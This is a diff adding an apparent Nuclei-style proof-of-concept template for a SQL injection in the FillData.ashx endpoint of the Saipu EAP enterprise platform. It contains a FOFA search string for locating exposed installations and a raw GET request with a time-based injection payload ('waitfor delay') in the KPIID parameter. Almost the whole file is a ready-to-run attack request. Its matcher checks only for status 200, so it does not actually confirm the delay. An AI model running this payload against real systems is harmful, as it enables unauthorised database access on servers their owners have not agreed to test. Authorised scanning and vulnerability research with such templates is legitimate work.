@@ -1,0 +1,29 @@
+id: poc-bathphwwz8ycggvh
+info:
+  name: 赛普EAP企业适配管理平台FillData.ashx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bathphwwz8ycggvh'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bathphwwz8ycggvh
+    fofa: body="IDWebSoft" || title="RMS房地产管理系统" || title="赛普EAP企业适配管理平台"
+http:
+- raw:
+  - 'GET /IDWebSoft/FillData.ashx?action=HR_GetKPIIndexFormulaInfo&KPIID=1'';waitfor+delay+''0:0:3''--+q HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
+
+    Content-Type:application/x-www-form-urlencoded
+
+    Accept: */*
+
+    Connection: Keep-Alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
